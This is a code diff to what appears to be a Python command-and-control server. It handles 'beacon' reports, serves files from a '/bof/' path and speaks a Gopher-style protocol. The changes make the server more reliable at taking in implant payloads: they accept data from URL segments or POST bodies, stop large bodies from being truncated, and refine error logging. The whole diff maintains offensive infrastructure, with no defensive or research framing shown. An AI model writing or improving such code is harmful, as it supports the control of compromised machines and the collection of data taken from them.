@@ -331,7 +331,10 @@ def handle_report(state: C2State, b64_payload: str) -> bytes:
         client_id = data.get("client", "unknown")
 
     except Exception as e:
-        logging.error("report decode error: %s", e)
+        logging.error(
+            "report decode error: %s (payload_len=%d head=%r tail=%r)",
+            e, len(b64_payload), (b64_payload or "")[:24], (b64_payload or "")[-24:]
+        )
         return b"ERROR\r\n"
 
     with state.lock:
@@ -458,7 +461,12 @@ def handle_request(state: C2State, selector: str) -> bytes:
                 state.cfg["report_uri"].rstrip("/") + "/"
             ):
                 prefix = state.cfg["report_uri"].rstrip("/") + "/"
-                return handle_report(state, unquote(path[len(prefix) :]))
+                # v1 beacons carry the payload in the POST body; v2/v3
+                # append it (percent-encoded) to the URL segment. Accept both.
+                payload = unquote(path[len(prefix) :]).strip()
+                if not payload:
+                    payload = rest.strip()
+                return handle_report(state, payload)
             if method == "GET" and path.startswith("/bof/"):
                 return handle_bof(state, unquote(path[len("/bof/") :]))
 
@@ -537,6 +545,10 @@ def _read_request(conn: socket.socket) -> bytes:
         if not chunk:
             break
         rest += chunk
+    # `data` only holds bytes read up to the header terminator; splice the
+    # fully-read body back in so large POST bodies are not truncated.
+    if length:
+        data = head + b"\r\n\r\n" + rest
     return data
 
 
@@ -572,7 +584,10 @@ def serve_client(state: C2State, conn: socket.socket, addr: tuple):
         # Legacy Gopher dialect: raw payload, no framing.
         conn.sendall(handle_request(state, data.decode("latin-1")))
     except Exception as e:
-        logging.error("client handler error: %s", e)
+        if "Connection reset by peer" in str(e):
+            logging.debug("client hung up: %s", e)
+        else:
+            logging.error("client handler error: %s", e)
     finally:
         conn.close()
 
